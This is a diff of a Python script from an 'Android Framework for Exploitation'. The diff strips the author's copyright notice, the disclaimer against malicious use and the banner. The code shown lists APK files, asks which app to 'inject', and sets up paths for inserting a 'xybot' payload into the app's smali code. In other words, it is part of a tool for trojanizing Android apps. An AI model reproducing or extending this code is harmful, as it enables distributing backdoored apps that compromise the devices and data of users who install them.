@@ -1,11 +1,5 @@
 #!/usr/bin/python
-#----------------------------------------------------------------------------------------------#
-# Android Framework for Exploitation v-1                                                        #
-# (C)opyright 2010 - XYS3C                                                                     #
-#---Important----------------------------------------------------------------------------------#
-#                     *** Do NOT use this for illegal or malicious use ***                     #
-#              The programs are provided as is without any guarantees or warranty.             #
-#---Defaults-----------------------------------------------------------------------------------#
+
 import os
 import glob
 import shutil
@@ -21,22 +15,8 @@ def signal_handler(signal, frame):
 	time.sleep(5)
 	sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
-################################################################################################
-#                                 MAIN SCREEN                                                  #
-################################################################################################
 
-print "---The Android Exploitation Framework ---"
-print " _______  _______  _______    _               _______     __   "
-print "(  ___  )(  ____ \(  ____ \  ( )  |\     /|  (  __   )   /  \  "
-print "| (   ) || (    \/| (    \/  | |  | )   ( |  | (  )  |   \/) ) "
-print "| (___) || (__    | (__      (_)  | |   | |  | | /   |     | | "
-print "|  ___  ||  __)   |  __)      _   ( (   ) )  | (/ /) |     | | "
-print "| (   ) || (      | (        ( )   \ \_/ /   |   / | |     | | "
-print "| )   ( || )      | (____/\  | |    \   /    |  (__) | _ __) (_"
-print "|/     \||/       (_______/  (_)     \_/     (_______)(_)\____/"
-print ""                                                               
-print "Copyright Reserved : XYS3C (Visit us at http://xysec.com)"
-print"----------------------------------------------------------------"
+
 print "Files Available in the Input Folders:"
 print "----LIST----"
 os.chdir("../apks")                #changed Inputs to apks
@@ -50,6 +30,8 @@ while not os.path.isfile(origapp):
 	for files in glob.glob("*.apk"):
 		print "* " + files
 	origapp = raw_input("Enter the name of the apk you want to inject: ")
+
+
 
 if os.path.isdir(os.getcwd()+ "/../temp/")== False:
 	os.mkdir(os.getcwd()+ "/../temp/")
@@ -68,6 +50,8 @@ tmpfol = origapp.replace(' ', '')[:-4]
 print "Injecting Phase 1"
 print "******************"
 injct = os.getcwd() + "/../bin/xybot"
+
+
 
 neworigapp = os.getcwd() + "/" + tmpfol + "/smali/com/xybot"
 print "Original App location is set to be " + neworigapp
